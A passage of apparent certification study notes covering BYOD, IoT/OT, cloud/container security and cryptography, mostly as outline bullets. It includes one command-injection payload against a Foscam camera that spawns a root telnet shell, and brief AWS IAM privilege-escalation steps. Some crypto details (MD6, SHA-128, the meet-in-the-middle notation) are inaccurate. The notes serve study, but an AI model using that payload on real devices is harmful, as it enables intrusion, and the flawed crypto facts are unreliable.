        - https://www.manageengine.com/mobile-device-management/
    - IBM MaaS360
        - https://www.ibm.com/products/unified-endpoint-management
- BYOD
    - Using personal devices
    - Conform to company policy
    - Benefits
        - Productivity
        - Flexibility
        - Reduced costs
        - Happy employees
    - Risks
        - Support of variety of devices
            - Increases the attack surface
        - Co-mingling of personal/private data
        - Insecure device disposal
        - Unsecured networks
            - Mobile devices will be constantly accessing untrusted and possibly
        - Unsecured networks
        - Lost/stolen devices
        - Loose control of user activity
            - Users can bypass security policy
                - Example:
                    - User can't access www.cewlsite.com over company network
                    - User switches to cellular network
     - BYOD Security Policy
        - Will allow for a secure and controllable BYOD environment
            - Define requirements
                - Who/What/When/Where/Why will this device be used
            - Standardize technology
                - Hardware and Software
                    - List approved devices
                    - List approved apps
            - Formalize policies
                - Publish and disseminate policy info
            - Implement Security
                - Asset and Identity Management
                - Local storage control
                - Removable media control
                - Network Access Control
                - Device password
                - Org vs Personal App control
                - Web security
                - Messaging security
                - Device Health
                - DLP
            - Implement Support
                - Trained support staff
- General Security Guidelines for Mobile
    - Apply updates/patches
    - Disk encryption
    - Use passwords
    - No sideloading/rooting/jailbreaking
    - Secure wipe/delete/disposal
    - Keep app installs to a minimum
    - Use AV/Anti-spyware

## Module 18
**IoT Basics**
- Define IoT
    - "The process of connecting everyday objects and systems to networks in order to make them globally available and interactive." - Daniel Miessler
    - Consumer IoT
    - Industrial IoT (IIoT)
        - https://danielmiessler.com/blog/the-differences-and-similarities-between-iot-and-ics-security/
- IoT Components
    - The IoT "THING"
        - Sensor
        - Camera
    - IoT Gateway
        - Connects IoT Devices to...
            - each other
            - end-user
            - cloud/internet
        - https://www.dell.com/en-us/work/shop/gateways-embedded-computing/sf/edge-gateway
    - Cloud Server
        - Stores and/or Processes IoT Data
    - Remote Apps
        - End-user control panel/dashboard
- IoT Architecture
    - Edge Technology
        - IoT Hardware Components
    - Access Gateway
        - Inter-technology communication devices
    - Internet Layer
        - IP-based communication
    - Middleware
        - Services that run in the background of application layer software
    - Application Layer
        - Provides end-user operation and interaction
- IoT Deployment Areas
    - Commercial/Industrial
    - Consumer
    - Heathcare
    - Transportation
    - Energy
    - Military/Law Enforcement
    - IT
- Common IoT Technologies and Protocols
    - Communication
        - Wi-Fi
        - RFID
        - LTE-Advanced (medium-range)
        - Low-Power Wide Area Networking (LPWAN) (Long-Range)
        - Sigfox (long range)
        - Ethernet (wired)
    - Operating Systems for IoT
        - ARM mbed OS
        - Win10 IoT
        - Contiki
        - Ubuntu Core
- Communication Models
    - Device-to-Device
    - Device-to-Cloud
        - Devices --> App Service Provider
    - Device-to-Gateway
        - Devices --> IoT Gateway --> App Service Provider
    - Back-End Data-Sharing
        - Device --> App Service Provider1 --> App Service Provider2/3/4/etc
- IoT Security Challenges
    - Weak or no intrinsic security
        - Weak authentication
        - Poor access control implementation
        - Vulnerable web apps
        - Clear-text communications
        - Buffer Overflows (RCE)
    - Support could be lacking or non-existent
    - Device theft

**IoT Threats and Vulnerabilities**
- OWASP Top 10 IoT Threats (2018)
    - https://owasp.org/www-project-internet-of-things/
- IoT Attack Surfaces
    - Ecosystem
    - Admin Portals and Web Interfaces
    - Physical Interfaces
    - Firmware
    - Network Traffic/Communication
    - Vendor and/or 3rd-Party APIs
    - Local Storage
    - Mobile App
- IoT Vulnerabilities
    - Many Oldies-but-goodies
        - Weak/No Encryption
        - Weak/No Passwords
        - No MFA/2FA
        - No lockout policy/capability
        - DoS
        - Theft
        - Lack of updates/patches/support
        - Physical console access
        - Insecure 3rd-Party components
        - JTAG(Joint Test Action Group) and side-channel

**IoT Attacks, Tools and Countermeasures**
- Standard-issue threats
    - SQLi
    - Ransomware
    - DoS
    - MitM
    - RCE
- Tools
    - Shodan
    - Censys
    - Thingful
    - Wireshark
    - TCPDump
    - Attack Proxy
    - SDR tools (Parrot)
- DEMO hacking the Foscam
    - NTP Server Command Injection
        - `;/usr/sbin/telnetd -p37 -l /bin/sh;`
- Interesting IoT Attacks
    - HVAC
        - Shodan search for Metasys
    - Rolling Code Attack
        - Automobile hacking
            - Key fob for door locks
                - Uses rolling code (code can't be used twice in a row)
                    - Attacker blocks/sniffs the unlock signal
                        - Repeat the process
                            - Attacker then sends first code to car
                                - Car unlocks
                                    - Attacker then uses 2nd code to unlock car later
                                    - Blueborne
                                    + Bluetooth vuln
                                    - Allows for complete takeover of a device
                                    - DoS by Jamming Attack
                                    - Sybil Attack
                                    + VANET(Vehicular Ad-Hoc Network)
                                    - Used to send traffic updates and safety messages between vehicles
                                    + Sybil disrupts this by simulating traffic congestion
- Countermeasures
    - The Standards
        - Change Defaults
        - Updates and Patches
        - Encryption
        - Disable unnecessary services
        - Physical Security
        - Logging and Monitoring
        - Lockouts
    - SDR Security
        - Don't use 'Rolling Code'
        - Utilize preamble and synchronization nibbles
        - Use encryption
    - Manufacturer Security
        - Secure boot chain
            - Software verification technique
        - Chain of trust the update process
    - Other Defenses
        - IoT Device Management
            - IBM Watson IoT
            - Predix
            - AT&T
            - Oracle

**OT Basics**
- What is OT
    - Operational Technology
        - Managing, Monitoring, and Controlling industrial operations
            - Focused on the physical devices and processes they use
- OT Components/Systems
    - ICS (Industrial Control System)
    - SCADA (Supervisory Control And Data Acquisition)
        - Gathers and presents data to operators
        - Make decisions about processes with the aid of operator input
        - Control plant functions based on those decisions
    - DCS (Distributed Control System)
        - Like SCADA, but focused more on automation
    - PLC (Programmable Logic Controller)
    - RTU (Remote Terminal Unit)
        - aka Remote Telemetry Unit and Remote Telecontrol Unit
            - A 'beefed-up' PLC
                - Better environmental tolerances
                - Backup power options
                - Autonomy
    - BPCS (Basic Process Control System)
    - SIS (Safety Instrumented Systems)
        - Sensors, logic solvers, and final control elements
            - Protects personnel, equipment, and environment
                - Isolates the plant in case of an emergency
    - HMI (Human Machine Interface)
        - Screen that allows a human to interact with a machine
            - Data input/output
                - Subset of SCADA
    - IED (Intelligent Electronic Devices)
        - Devices that receive data from sensors and/or power equipment
    - Issue control commands like
        - Tripping breakers during voltage/current/frequency anomalies
            - Example device: voltage regulator
    - IIOT (Industrial Internet of Things)
        - The convergence of OT and IT
            - Using traditional IT infrastructure to manage OT devices
- OT Security Challenges
    - Plain Text Passwords/Protocols
    - Complexity
    - Proprietary tech
    - Legacy Tech
    - Lack of security professionals
    - Converging with IT brings in IT Security issues

**OT Attacks, Tools and Countermeasures**
- OT Vulnerabilities
    - Internet-connected OT systems
    - OT System connected to system that is connected to Internet
    - Missing or Non-existent updates
    - Weak passwords and/or no authentication
    - Weak firewall rules (ingress/egress)
    - Non-existent network segmentation
    - Weak or non-existent encryption
- OT Threats
    - Malware
        - Introduced through
            - Removable Media
            - External hardware
            - via Internet
                - IT connected systems
                    - Web / Database
                    - Compromised Cloud
                    - Infected end-user devices
    - DoS/DDoS
    - Sensitive data exposure
    - HMI-based Attacks
        - Buffer Overflows
        - Authentication/Authorization
            - Creds in Clear-text
            - Hard-coded creds
            - Sensitive info transmitted in the clear
    - Human Error
    - Side-Channel attacks
        - Monitoring physical aspects of the OT
            - Timing Analysis
                - Observe the time it takes to complete password auth process
                    - Deduce password or crypto-key
            - Power Analysis
                - Attacker using a oscilloscope observes power consumption between clock cycles
    - RF Connected controller attacks (attacks against RF communications)
        - Replay attacks
            - Capture and replay legit command traffic
        - Command Injection
            - Create and inject malicious traffic
        - Malicious RF Controller Re-pairing attack
            - "Evil" Controller
        - Malicious Reprogramming attack
            - Evil firmware
- Tools
    - Shodan
    - SearchDiggity
    - s7scan
    - plcscan
    - smartrf packet sniffer (https://www.ti.com/tool/download/PACKET-SNIFFER-2)
    - ISF (ICS Exploitation Framework)
- Countermeasures
    - Updates/Patches
    - Secure Coding practices
    - Change defaults (passwords/configs)
    - Secure authentication (strong passwords/MFA)
    - Disable/Secure remote access
    - Encryption
    - Firewalls/IDS/IPS
    - Network Segmentation
    - Security training
    - OT Specific monitoring solutions
    - Honeypots/Honeynets (conpot)

## Module 19
**Cloud Computing Basics**
- Types of Cloud Services
    - IaaS
    - PaaS
    - SaaS
    - IDaaS
        - ID as a Service
        - Identity and Account Management Services
            - SSO
            - MFA
    - SECaaS
        - Security as a Service
            - Pentests
            - AV/EDR
            - Incident Response
    - CaaS
        - Container as a Service
            - Container/app/cluster management
    - FaaS
        - Function as a Service
            - Microservices
            - App Functions
                - AWS Lambda
- Responisibility Areas
    - On Prem
        - ALL Subscriber
    - IaaS
        - Subscriber
            - Applications
            - Data
            - Runtime
            - Middleware
            - OS
        - Service Provider
            - Virtualization environment
            - Metal servers
            - Storage
        - Network
    - PaaS
        - Subscriber
            - Applications
            - Data
        - Service Provider
            - Runtime
            - Middleware
            - OS
            - Virtualization environment
            - Metal servers
            - Storage
            - Network
    - SaaS
        - ALL Serice Provider
- Deployment Models
    - Public
    - Private
        - Single org use
    - Community
        - Multiple org use
            - Common industry and security concerns
                - Healthcare
                - Transportation
                - Hotel
    - Hybrid
        - Some mixing of the cloud Deployment Models
    - Multi-Cloud
        - Environment that spans across Multiple cloud providers
            - Single management interface
- NIST Cloud Deployment Reference Architecture
    - Cloud Consumer
    - Cloud Provider
    - Cloud Carrier
        - The org that provides network connectivity between consumers and providers
    - Cloud Auditor
        - 3rd-party examiners
            - Regulation and compliance
            - Security and services
    - Cloud Broker
        - Intermediary that specializes in cloud management
            - Categories
                - Service aggregation
                    - The cloud broker combines and integrates multiple existing services into new service, carrying responsibility of data integration between cloud consumer and cloud providers.
                - Service intermediation
                    - A cloud broker provides value-added service, enhancing an existing service by improving some of its capabilities.
                - Service arbitrage
                    - This is similar to service aggregation but with flexible dynamic choice of service providers based on the broker’s internal evaluations.
 - Cloud Storage Architecture
    - Front-End
        - Where the end user interacts with the data through an API
    - Middleware
        - Data De-duplication and Replication
    - Back-End
        - Metal hardware

**Container Basics**
- What is a container?
    - Portable Software package/bundle
        - Config files
        - Libraries
        - Dependencies
            - Everything needed to run an app
                - Consistent across platforms
            - Scalable
            - Cost effective
    - 5-Tier Container Architecture (As defined by CEH)
        - Tier1: Developer Machines
            - Image Creation, Testing, and Accreditation
        - Tier2: Testing and Accreditation Systems
            - Verification and Validation of image contents
            - Signing Images
            - Sending Images to Registry
        - Tier3: Registries
            - Storing Images
            - Delivering Images to Orchestrators based on requests
        - Tier4: Orchestrators
            - Transforming Images into Containers
            - Deploying Containers to Hosts
        - Tier5: Hosts
            - Operating and managing Containers as instructed by the Orchestrator
- What is Docker?
    - Open source containerization platform
        - Building .......\
        - Deploying ------> Containerized Apps
        - Managing.... /
    - Terms
        - Images: Basic foundation for building of containers
        - Container: Created from Images and run the actual application
        - Docker Daemon: Background service that listens for Docker API requests and manages docker objects like Images, Containers, Networks, and Volumes
        - Docker Client: Primary way most users interact with Docker
        - Docker Registry: aka Docker Hub. Repo of official Images. Private registries are configurable
        - Dockerfile: Simple text file that contains a list of commands that the Docker client calls while creating an image
- What is orchestration?
    - Automation of container lifecycle
        - Provisioning
        - Configuring
        - Deploying
        - Security
        - Monitoring
        - Resource allocation
        - Scaling
    - Orchestration Apps
        - Docker Swarm
        - Kubernetes
        - OpenShift
        - Ansible
- Container Security Challenges
    - Large attack surface
        - Increased complexity through many objects
            - Containers
            - Apps
            - Databases
    - Container breakout
        - Attacker can breach the 'wall' between the container and host
            - Running as root
    - Vulnerable source code
        - Devs use containers for testing code
            - Could expose org to attack through insecure code
    - Insecure storage of secrets
        - API Keys
        - Usernames
        - Passwords
    - Noisy Neighbor
        - Containers may exhaust resources
            - Makes other containers fail due to lack of resources

**Hacking Cloud Services**
- Cloud Vulnerability Scan
    - Trivy
    - Clair
    - Dadga
    - Twistlock
    - Kubernetes
        - Sysdig
        - etcd process enumeration
            - key storage
            - API objects
            - Config files
            - Open ports
- S3 Discovery and Enumeration
    - Check source code for S3
    - Brute-Force
        - Attack proxy
        - BucketKicker
            - https://github.com/craighays/bucketkicker
        - s3scanner
            - https://pypi.org/project/S3Scanner/
    - S3 Inspector
        - https://github.com/clario-tech/s3-inspector
        - Enumerates
            - Bucket permissions
            - Public/Private status
- AWS enumeration
    - Account IDs
        - Github
        - AWS Error messages
            - Public AMIs
            - People posting on social or in help forums
        - IAM Roles and Creds
            - Find Keys here
                - Git Repo
                - Social Engineering
            - Password Reuse
                - Login to AWS and download keys
            - Vulnerable App hosted in AWS
                - SSRF
            - 3rd-Party cloud management app
            - Insider Threat
        - IAM Role Misconfiguration
            - PACU (Rhino Security Labs)
                - https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/
            - CloudGOAT 2
                - https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/
    - AWS-Pwn
        - https://github.com/dagrz/aws_pwn
- AWS IAM Priv Esc Techniques
    - Create an EC2 instance with existing EC2 profile
        - Needs access to
            - iam:PassRole
            - ec2:RunInstances
        - Attacker then accesses the OS and looks for AWS keys in metadata
    - Create a new policy version
        - Set custom permissions
        - --set-as-default flag
    - Add user to group
        - iam:AddUserToGroup permission
            - Add account to existing group
                - User inherits group permissions 

**Cloud Security Controls**
- Standard Security Controls
    - SDLC
    - Patches/Updates
    - Change Defaults
    - Firewall/IDS/IPS/WAF
    - Logging/Monitoring
    - Anti-DoS/DDoS
    - Encryption
    - AV/Endpoint Protection
- Cloud Specific
    - Secure Your S3 Buckets
        - IAM user policies
            - public/everyone = just say no!
                - https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_examples.html
            - Other Policies
                - search for this with Google or the aws docs
                    - Block public access for s3 (on by default)
                    - Enable encryption (also on by default)
                    - Bucket versioning (like volume shadow copy for S3)
    - Docker
        - Use trusted Docker images
        - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
    - Kubernetes
        - https://www.bluematador.com/blog/kubernetes-security-essentials
- Cloud, Container, and Kubernetes Security Tools
    - Qualys Cloud Platform
        - https://www.qualys.com/cloud-platform
    - Prisma Cloud
        - https://www.paloaltonetworks.com/prisma/cloud
    - Aqua
        - https://www.aquasec.com
            - Docker and Kubernetes (and basically everything else)
    - Tenable Container Security
        - https://www.tenable.com/products/tenable-io/container-security
    - Kube-bench
        - https://github.com/aquasecurity/kube-bench
    - Sumo Logic
        - https://www.sumologic.com

## Module 20
**Crytography Basics**
- Purpose of Cryptography
    - Protect CIA + Non-Repudiation
- Crypto Types
    - Symmetric
    - Asymmetric
- GAK
    - Government Access to Keys
        - All keys are given to Gov
        - Gov securely stores keys
        - Gov can access keys with court order
        - Gov can 'eavesdrop' using keys
            - Like a wiretap order
- Ciphers
    - Classical Ciphers
        - Substitution
        - Transposition
    - Key Based
        - Private-key
            - aka Symmetric
        - Public-key
            - aka Asymmetric
    - Input Based
        - Block Cipher
        - Stream Cipher

**Cryto Algorithms and Implementations**
- Algorithms
    - Symmetric
        - DES/3DES
        - RC(4/5/6)
        - Blowfish
        - AES
    - Asymmetric
        - RSA
        - Diffie-Hellman
- Hashing
    - MD(5/6)
        - https://datatracker.ietf.org/doc/html/rfc1321
    - SHA(128/256/512)
        - https://datatracker.ietf.org/doc/html/rfc3174
    - RIPEMD-160
    - HMAC
        - https://csrc.nist.gov/csrc/media/publications/fips/198/1/final/documents/fips-198-1_final.pdf
- Digital Signatures
- Hardware-based Encryption
    - TPM
    - USB
    - HSM
    - Hard-drive
- Other Encryption Implementations
    - Elliptic Curve
        - Advanced Algebraic equations to create shorter keys
            - Increased efficiency
    - Quantum
        - Stores encrypted information in the quanta
    - Homomorphic
        - Encrypted data can be modified without decrypting it

**Crytography Tools**
- Tools
    - GPG
    - GPG4Win
    - BCTextEncoder
    - Mobile
        - Google Play
        - Apple App Store

**Public key Infrastructure**
- Define PKI
    - Public Key Infrastructure
        - Create certs
        - Issue certs
        - Revoke certs
        - Manage certs
- PKI Components
    - https://www.techotopia.com/index.php/An_Overview_of_Public_Key_Infrastructures_(PKI)
    - Certificate Management System (this is the software that runs the whole thing)
        - Creates Certificates
        - Certificate Distribution
        - Certificate Store
        - Certificate Verification
    - Digital Certificates
        - The actual cert
        - Used to verify entities (users)
    - Validation Authority
        - Validates digital certs
            - Does this by hosting a Certificate Revocation List (CRL) and responding to CRL requests
                - Reduces workload of the CA
    - Certificate Authority
        - Issues digital Certs
        - Validates digital certs
        - Revokes digital certs
        - Deletes certs
    - End Users
        - Request Certs
        - Manages
    - Registration Authority
        - 'pre-screens' cert signing requests for initial enrollments and renewals
            - RA verifies requester (person/org)
                - Then forwards these requests to the CA
- PKI Process
    - 1. Subject (user/org) applies for cert from the RA
    - 2. RA processes the request
    - Verifies the subject's identity
    - Requests the CA to issue Public Key cert to Subject
    - 3. CA processes request from RA
    - Issues Cert/public key to Subject
    - An update message is sent to the VA with the Subject's info
    - 4. User receives cert and uses it
    - Communication is signed with cert
    - 5. Recipient(Client) queries the VA
    - Checks that the cert is valid
    - 6. VA verifies the cert
- CA Services
    - 3rd party trusted
- Signed CA vs Self Signed
    - Hi! I'm Billy.
        - How can I verify that you're really Billy?
            - I can show you some ID.
                - OK, Let's see it.
                    - Hold on while I create my ID.
                        - So you're going to generate your own ID.
                            - Yup!

**Cryptanalysis**
- What is Cryptanalysis?
    - Studying cryptosystems
    - Looking for exploitable weaknesses
- Methods
    - Linear
        - aka Known-Plaintext Attack
            - Requires both encrypted and plain-text data
                - Some plain-text could be guessed
                    - Common words, names, and/or phrases
                - Goal is to reverse-engineer a decryption key
                    - Further messages that were encrypted using that key could then be easily decrypted
- Differential
    - Attacker defines the plaintext inputs and analyzes the results
        - Continues this process until the key is determined
            - Chosen-Plaintext Attack
                - http://www.theamazingking.com/crypto-diff.php
    - Integral
        - Type of Differential attack
        - Uses larger inputs
        - Applicable to block ciphers
- Code Breaking
    - Brute-Force
    - Frequency Analysis
- Attacks
    - Man-in-the-Middle
    - Meet-in-the-Middle
        - Reduces the time it takes to break encryption on ciphers that use multiple keys
            - Double-DES is vulnerable
            - Known-plaintext attack
                - `PT --> E<k2> --> E<k2> --> CT`
                - Apply known-plaintext attack from both sides to 'meet in the middle'
            - PT --> E(k1) = X
            - CT --> E(k2) = X
                - If X is the same for both then you've found the keys
    - Side-Channel Attacks
        - Physical attack
            - Monitors environmental aspects of the target to reveal sensitive info
                - Power Usage
                - Electromagnetic Radiation
                - Light Emanation
                - Audio Emanation
    - Hash Collisions
        - https://crackstation.net
    - Related Key
        - WEP
    - Rubber Hose Attack

**Cryto-Attack Countermeasures**
- Secure key sharing
- Use higher bit length and symmetric key algorithms
    - At least 168 bit key size
        - Preferably 256 bit
- Use encryption with proven track record of security
    - At least 2048 bit key size
- Don't hard-code keys into source code or compiled into a binary
- Encrypt your keys with a password/passphrese
- Implement Key Stretching
    - Makes weak keys stroger through increasing their length
        - Password-Based Key Derivation Function 2 (PBKDF2)
        - bcrypt
